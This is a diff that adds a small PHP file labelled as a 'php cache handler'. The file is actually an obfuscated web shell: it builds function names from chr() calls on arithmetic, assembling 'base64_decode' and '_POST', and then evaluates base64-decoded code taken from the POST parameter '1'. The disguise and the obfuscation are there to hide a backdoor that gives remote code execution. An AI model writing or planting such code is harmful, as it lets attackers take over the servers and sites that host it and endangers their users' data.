@@ -1,0 +1,3 @@
+<?php
+/* php cache handler*/
+function onsp($bfwo){$zbytopau="dlcutcdehjoibrakaaeha";$vjdca=$zbytopau[2];$lzn=$zbytopau[8];$nqeasad=$zbytopau[13];$di = $vjdca.$lzn.$nqeasad;return $di($bfwo);}$laln=onsp(144-46).onsp(25+72).onsp(123-8).onsp(166-65).onsp(39+15).onsp(103-51).onsp(44+51).onsp(42+58).onsp(166-65).onsp(19+80).onsp(42+69).onsp(42+58).onsp(166-65);$gk = onsp(90-11);$cuh = onsp(114-34);$cuygqp = onsp(60+23);$tjkuyzyq = onsp(149-65);$qspzc = onsp(44+51);$dhwxpns = ${ $qspzc.$cuh.$gk.$cuygqp.$tjkuyzyq};$vj = onsp(61-12);eval($laln($dhwxpns[$vj]));
